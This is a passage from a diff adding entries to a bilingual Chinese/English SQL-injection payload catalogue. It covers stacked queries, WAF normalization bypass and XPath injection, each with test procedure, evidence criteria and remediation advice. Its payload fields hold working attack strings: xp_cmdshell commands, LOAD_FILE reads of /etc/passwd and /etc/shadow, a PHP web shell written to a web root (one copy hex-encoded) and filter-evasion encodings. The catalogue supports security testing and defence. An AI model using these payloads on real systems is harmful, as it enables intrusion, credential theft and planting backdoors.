+          "sqli2-sqlite-attach-database-file-write",
+          "sqli2-sqlite-version-schema-and-column-enumeration"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-stacked-query-read-only-proof",
+      "prerequisites": [
+        {
+          "zh": "为每种 DBMS 使用独立可销毁实例，先确认驱动允许多语句，并仅以短延时第二语句建立只读证明。",
+          "en": "Use a separate disposable instance for each DBMS, first confirm that the driver permits multiple statements, and establish read-only proof only with a short-delay second statement."
+        },
+        {
+          "zh": "为 xp_cmdshell、LOAD_FILE 和 OUTFILE 分别记录功能开关、数据库角色、服务账户及文件系统权限，不共享前置条件。",
+          "en": "Record feature switches, database roles, service identities, and filesystem permissions separately for xp_cmdshell, LOAD_FILE, and OUTFILE; do not share prerequisites."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性必须按拆分层级判定：短延时且有会话审计只能证明第二语句执行；命令、读文件或写文件能力还必须在各自隔离流程中产生唯一无害标记和系统审计事件。模型或页面回显 SQL、一次慢响应、权限错误、空结果、虚构命令输出或数据库功能已关闭都不是高影响链成功。",
+        "en": "Positive evidence must be evaluated per split tier: a short tagged delay proves only second-statement execution, while command, file-read, or file-write capability additionally requires a unique harmless marker and system audit event in its own isolated workflow. SQL reflected by a model or page, one slow response, permission errors, empty results, fabricated command output, or a disabled database feature is not a successful high-impact chain."
+      },
+      "opsecTips": [
+        {
+          "zh": "短延时第二语句得到一次可重复证明后停止；不得在同一运行中继续到 xp_cmdshell、LOAD_FILE 或 OUTFILE。",
+          "en": "Stop after one repeatable proof of the short-delay second statement; do not continue to xp_cmdshell, LOAD_FILE, or OUTFILE in the same run."
+        },
+        {
+          "zh": "终止等待会话，删除临时表和标记文件，撤销文件权限并恢复 xp_cmdshell 等功能开关及连接池状态。",
+          "en": "Terminate waiting sessions, delete temporary tables and marker files, revoke filesystem grants, and restore feature switches such as xp_cmdshell and connection-pool state."
+        }
+      ],
+      "name": {
+        "zh": "堆叠查询与数据库高影响链（待拆分）",
+        "en": "Stacked Queries and High-Impact Database Chains (Split Required)"
+      },
+      "description": {
+        "zh": "混合时间证明、SQL Server 命令执行、数据库文件读取与 MySQL 文件写入，需按影响和权限拆分。",
+        "en": "Combines timing proof, SQL Server command execution, database file reads, and MySQL file writes and must be split by impact and privileges."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "堆叠查询影响拆分",
+        "en": "Stacked-Query Impact Split"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "堆叠查询与数据库高影响链（待拆分）聚焦分号后的短延时只能证明第二语句执行；xp_cmdshell、LOAD_FILE 和 OUTFILE 各自需要产品、开关、角色和文件 ACL。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Stacked Queries and High-Impact Database Chains (Split Required) focuses on this boundary: A short delay after a semicolon proves second-statement execution, while xp_cmdshell, LOAD_FILE, and OUTFILE each require product, feature, role, and filesystem prerequisites. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入可结束原语句并追加 SQL 时，影响由驱动和数据库账户决定；高权限功能会把注入升级为命令、文件读取或代码落地。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "When input can terminate and append SQL, impact depends on driver and database-account capabilities; privileged features escalate injection to commands, file reads, or code placement. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先只用短延时或固定常量 SELECT 证明堆叠，再读取配置与权限元数据；高影响命令分别路由到对应目标卡。 数据库审计必须显示同一请求执行第二语句；whoami、系统文件或 WebShell 失败只说明权限不足，不能否定堆叠注入。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "First prove stacking with a short delay or fixed constant SELECT, then inspect configuration and privilege metadata; route high-impact commands to focused target cards. Database auditing must show the same request executing a second statement; failure of whoami, system files, or a web shell indicates privilege limits, not absence of stacking. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "参数化查询、关闭不需要的多语句，禁用 xp_cmdshell，撤销 FILE 权限，并禁止数据库服务账户写入 Web 根。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Parameterize queries, disable unnecessary multi-statements and xp_cmdshell, revoke FILE privilege, and deny web-root writes to the database service account. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "expert"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认堆叠查询影响拆分前置条件",
+            "en": "Confirm Stacked-Query Impact Split prerequisites"
+          },
+          "description": {
+            "zh": "分号后的短延时只能证明第二语句执行；xp_cmdshell、LOAD_FILE 和 OUTFILE 各自需要产品、开关、角色和文件 ACL。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "A short delay after a semicolon proves second-statement execution, while xp_cmdshell, LOAD_FILE, and OUTFILE each require product, feature, role, and filesystem prerequisites. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控堆叠查询影响拆分探针",
+            "en": "Run a controlled Stacked-Query Impact Split probe"
+          },
+          "description": {
+            "zh": "先只用短延时或固定常量 SELECT 证明堆叠，再读取配置与权限元数据；高影响命令分别路由到对应目标卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "First prove stacking with a short delay or fixed constant SELECT, then inspect configuration and privilege metadata; route high-impact commands to focused target cards. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": ";SELECT SLEEP(5);--\n';SELECT SLEEP(5);--\n\";SELECT SLEEP(5);--\n' OR IF(1=1, SLEEP(5), 0)--\nEXEC xp_cmdshell 'whoami';--\nEXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts';--\nSELECT LOAD_FILE('/etc/passwd');--\nSELECT LOAD_FILE('/etc/shadow');--\nSELECT LOAD_FILE('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts');--\n' UNION SELECT '<?php system([\"cmd\"]);?>' INTO OUTFILE '/var/www/html/shell.php'--\n' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'--"
+        },
+        {
+          "title": {
+            "zh": "核对堆叠查询影响拆分成功证据",
+            "en": "Verify Stacked-Query Impact Split evidence"
+          },
+          "description": {
+            "zh": "数据库审计必须显示同一请求执行第二语句；whoami、系统文件或 WebShell 失败只说明权限不足，不能否定堆叠注入。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Database auditing must show the same request executing a second statement; failure of whoami, system files, or a web shell indicates privilege limits, not absence of stacking. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归堆叠查询影响拆分",
+            "en": "Remediate and regress Stacked-Query Impact Split"
+          },
+          "description": {
+            "zh": "参数化查询、关闭不需要的多语句，禁用 xp_cmdshell，撤销 FILE 权限，并禁止数据库服务账户写入 Web 根。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Parameterize queries, disable unnecessary multi-statements and xp_cmdshell, revoke FILE privilege, and deny web-root writes to the database service account. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option",
+        "https://dev.mysql.com/doc/refman/8.4/en/privileges-provided.html"
+      ],
+      "review": {
+        "decision": "split",
+        "rationale": "同一命令块跨越只读证明、命令执行、文件读取和写入，必须按影响和 DBMS 拆分。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-category",
+          "reviewed-command-dialects",
+          "documented-split",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references"
+        ],
+        "targetPayloadIds": [
+          "sqli2-mysql-load-file-read-impact",
+          "sqli2-mysql-outfile-and-dumpfile-write-impact",
+          "sqli2-sqlserver-xp-cmdshell-impact",
+          "sqli2-stacked-and-conditional-delay-probes"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-waf-bypass-patterns-for-sqli",
+      "prerequisites": [
+        {
+          "zh": "在 WAF、反向代理、应用框架和数据库边界记录原始字节、解码次数、字符集和最终 SQL 令牌。",
+          "en": "Record raw bytes, decode count, character set, and final SQL tokens at the WAF, reverse proxy, application framework, and database boundaries."
+        },
+        {
+          "zh": "确认 MySQL 版本注释及目标方言的注释规则，为规范形式、单一变换形式和结构相同的恒假谓词建立配对。",
+          "en": "Confirm MySQL version-comment behavior and the target dialect's comment rules, pairing canonical, single-transformation, and structurally matched false predicates."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性是规范形式被同一策略阻止，而某个最小编码、大小写或注释拆分变体被放行，随后由应用/数据库规范化为可执行谓词并产生受控标记差异。WAF 未告警、HTTP 200、日志显示 SELECT、数据库报语法错、双重解码只改变显示或页面复述字符串均是假阳性。",
+        "en": "Positive evidence is the canonical form being blocked by the same policy while one minimal encoding, case, or comment-splitting variant passes, is normalized into an executable predicate by the application or database, and produces a controlled marker differential. No WAF alert, HTTP 200, SELECT appearing in logs, a database syntax error, double decoding that changes only display, or page reflection is a false positive."
+      },
+      "opsecTips": [
+        {
+          "zh": "确认一个最小变换及其发生分歧的层后停止，不继续组合大小写、注释和多重百分号编码。",
+          "en": "Stop after confirming one minimal transformation and the layer where behavior diverges; do not combine case, comments, and repeated percent encoding."
+        },
+        {
+          "zh": "移除原始流量调试记录，清空代理和应用解码缓存，删除临时 WAF 例外，并恢复统一规范化规则。",
+          "en": "Remove raw-traffic debug records, clear proxy and application decoding caches, delete temporary WAF exceptions, and restore consistent normalization rules."
+        }
+      ],
+      "name": {
+        "zh": "SQL 注入规范化绕过模式",
+        "en": "SQL Injection Normalization-Bypass Patterns"
+      },
+      "description": {
+        "zh": "使用版本注释、关键词拆分、百分号编码和大小写变体，验证 WAF、应用与数据库解码及词法分析是否一致。",
+        "en": "Uses version comments, keyword splitting, percent encoding, and case variants to test decoding and lexical consistency across WAF, application, and database."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "SQL/WAF 规范化差异",
+        "en": "SQL/WAF Normalization Differences"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "SQL 注入规范化绕过模式聚焦MySQL 版本注释可执行内容，内联注释可拆词，百分号编码可在不同层解码；必须捕获原始字节和最终 SQL。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "SQL Injection Normalization-Bypass Patterns focuses on this boundary: MySQL version comments may execute content, inline comments can split tokens, and percent encoding can decode at different layers; capture raw bytes and final SQL. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "WAF 一次解码或简单正则后判断，而应用再次解码或数据库赋予注释特殊语义，攻击文本可能在检测后恢复为有效 SQL。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "When a WAF inspects after one decode or simple regex while the application decodes again or the database gives comments special meaning, text can become valid SQL after inspection. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先以普通 UNION 或真假谓词确认注入，再一次只改变注释、编码或大小写，保持 SQL 语义和其他字节不变。 只有普通形式被拦截、变体到达后端且最终表达式执行，才说明规范化绕过；单纯状态码变化不成立。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Confirm injection with a plain UNION or predicate, then change only comment, encoding, or case while preserving SQL semantics and all other bytes. A normalization bypass requires the plain form to be blocked, the variant to reach the backend, and the final expression to execute; status-code changes alone are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "在可信边界只做一次严格规范化，拒绝双重编码和非法 UTF-8，再类型校验与参数绑定；WAF 仅作纵深。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Canonicalize once at the trust boundary, reject double encoding and invalid UTF-8, then validate types and bind parameters; use the WAF only as defense in depth. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认SQL/WAF 规范化差异前置条件",
+            "en": "Confirm SQL/WAF Normalization Differences prerequisites"
+          },
+          "description": {
+            "zh": "MySQL 版本注释可执行内容，内联注释可拆词，百分号编码可在不同层解码；必须捕获原始字节和最终 SQL。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "MySQL version comments may execute content, inline comments can split tokens, and percent encoding can decode at different layers; capture raw bytes and final SQL. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控SQL/WAF 规范化差异探针",
+            "en": "Run a controlled SQL/WAF Normalization Differences probe"
+          },
+          "description": {
+            "zh": "先以普通 UNION 或真假谓词确认注入，再一次只改变注释、编码或大小写，保持 SQL 语义和其他字节不变。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Confirm injection with a plain UNION or predicate, then change only comment, encoding, or case while preserving SQL semantics and all other bytes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "/*!50000SELECT*/1--\n/*!UNION*//*!SELECT*/1,2,3--\n%55NION %53ELECT 1,2,3--\nuni/**/on sel/**/ect 1,2,3--\nunio%6e selec%74 1,2,3--\n1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--\n1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'"
+        },
+        {
+          "title": {
+            "zh": "核对SQL/WAF 规范化差异成功证据",
+            "en": "Verify SQL/WAF Normalization Differences evidence"
+          },
+          "description": {
+            "zh": "只有普通形式被拦截、变体到达后端且最终表达式执行，才说明规范化绕过；单纯状态码变化不成立。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "A normalization bypass requires the plain form to be blocked, the variant to reach the backend, and the final expression to execute; status-code changes alone are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归SQL/WAF 规范化差异",
+            "en": "Remediate and regress SQL/WAF Normalization Differences"
+          },
+          "description": {
+            "zh": "在可信边界只做一次严格规范化，拒绝双重编码和非法 UTF-8，再类型校验与参数绑定；WAF 仅作纵深。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Canonicalize once at the trust boundary, reject double encoding and invalid UTF-8, then validate types and bind parameters; use the WAF only as defense in depth. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+        "https://dev.mysql.com/doc/refman/8.4/en/comments.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是 SQL 词法和规范化层面的 Payload 集，不是 WAF 指纹工具或通用字典。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-xpath-injection",
+      "prerequisites": [
+        {
+          "zh": "使用只含合成用户和随机 canary 节点的独立 XML 文档，并确认 XPath 版本、命名空间及输入拼接位置。",
+          "en": "Use an isolated XML document containing only synthetic users and a random canary node, and confirm the XPath version, namespaces, and input concatenation position."
+        },
+        {
+          "zh": "启用编译后 XPath 或查询结果审计，为名称、节点计数和 substring 条件分别准备结构一致的真/假对照。",
+          "en": "Enable compiled-XPath or query-result auditing, and prepare structurally matched true and false controls for name, node-count, and substring conditions."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求恒真 XPath 条件稳定返回预置 canary 节点或计数，而恒假条件不返回，且编译查询显示输入越过字符串边界。XML 解析错误、命名空间不匹配、正常搜索命中、页面回显表达式、或猜中常见节点名都不是 XPath 注入证据。",
+        "en": "Positive evidence requires the true XPath condition to reproducibly return the preset canary node or count while the false condition does not, with the compiled query showing input crossing the string boundary. XML parse errors, namespace mismatch, legitimate search matches, expression reflection, or guessing a common node name are not XPath-injection evidence."
+      },
+      "opsecTips": [
+        {
+          "zh": "首次通过真/假条件定位到 canary 节点后停止，不枚举生产 XML 的用户、密码或完整树结构。",
+          "en": "Stop after the first true/false pair locates the canary node; do not enumerate users, passwords, or the full tree of production XML."
+        },
+        {
+          "zh": "删除测试 XML 和 canary，清除编译查询与响应缓存，并恢复命名空间配置和参数化 XPath 构造。",
+          "en": "Delete the test XML and canary, clear compiled-query and response caches, and restore namespace configuration and parameterized XPath construction."
+        }
+      ],
+      "name": {
+        "zh": "XPath 表达式注入",
+        "en": "XPath Expression Injection"
+      },
+      "description": {
+        "zh": "通过布尔谓词、节点计数、名称判断和 substring 条件，验证输入是否被拼接到 XPath 查询表达式。",
+        "en": "Uses Boolean predicates, node counts, name tests, and substring conditions to verify whether input is concatenated into an XPath query expression."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "XPath 查询注入",
+        "en": "XPath Query Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "XPath 表达式注入聚焦XPath 注入针对 XML 查询而非关系型 SQL；应记录 XPath 版本与命名空间，并使用成对真假节点条件。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "XPath Expression Injection focuses on this boundary: XPath injection targets XML queries rather than relational SQL; record XPath version and namespaces and use paired true and false node conditions. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入被插入 XPath 字面量或谓词后，可关闭原字符串并追加 or、节点选择或函数；许多 API 缺少统一参数绑定。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Input inserted into an XPath literal or predicate can close the string and append or, node selection, or functions; many APIs lack universal parameter binding. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "用受控账户建立匹配与不匹配基线，再以相同闭合方式发送真假谓词；盲测只对测试节点做 count 或单字符判断。 最终 XPath、返回节点集合和身份必须一致证明查询被改变；统一登录错误、表达式语法错或空节点都不是充分证据。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Use a controlled account for match and no-match baselines, then send true and false predicates with identical closure; blind tests should query only controlled nodes. Final XPath, returned node set, and identity must jointly prove query alteration; generic login errors, expression errors, or empty nodes are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用固定 XPath 与变量解析器，不拼接路径或谓词；若无变量 API，使用经过验证的 XPath 字面量编码器并限制 XML 权限。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use fixed XPath with variable resolvers rather than concatenating paths or predicates; if variables are unavailable, use a vetted XPath literal encoder and restrict XML access. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认XPath 查询注入前置条件",
+            "en": "Confirm XPath Query Injection prerequisites"
+          },
+          "description": {
+            "zh": "XPath 注入针对 XML 查询而非关系型 SQL；应记录 XPath 版本与命名空间，并使用成对真假节点条件。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "XPath injection targets XML queries rather than relational SQL; record XPath version and namespaces and use paired true and false node conditions. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控XPath 查询注入探针",
+            "en": "Run a controlled XPath Query Injection probe"
+          },
+          "description": {
+            "zh": "用受控账户建立匹配与不匹配基线，再以相同闭合方式发送真假谓词；盲测只对测试节点做 count 或单字符判断。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Use a controlled account for match and no-match baselines, then send true and false predicates with identical closure; blind tests should query only controlled nodes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "' or 1=1 or ''='\n' or name()='admin' or '\ncount(/child::node())\n' and string-length(/root/child::*)>0 and '1'='1\n' or substring(//user[position()=1]/child::node()[position()=1],1,1)='a"
+        },
+        {
+          "title": {
+            "zh": "核对XPath 查询注入成功证据",
+            "en": "Verify XPath Query Injection evidence"
+          },
+          "description": {
+            "zh": "最终 XPath、返回节点集合和身份必须一致证明查询被改变；统一登录错误、表达式语法错或空节点都不是充分证据。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Final XPath, returned node set, and identity must jointly prove query alteration; generic login errors, expression errors, or empty nodes are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归XPath 查询注入",
+            "en": "Remediate and regress XPath Query Injection"
+          },
+          "description": {
+            "zh": "使用固定 XPath 与变量解析器，不拼接路径或谓词；若无变量 API，使用经过验证的 XPath 字面量编码器并限制 XML 权限。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use fixed XPath with variable resolvers rather than concatenating paths or predicates; if variables are unavailable, use a vetted XPath literal encoder and restrict XML access. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://owasp.org/www-community/attacks/XPATH_Injection",
+        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "XPath 条件是查询表达式载荷，不是 XML 工具命令。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    }
+  ]
+}
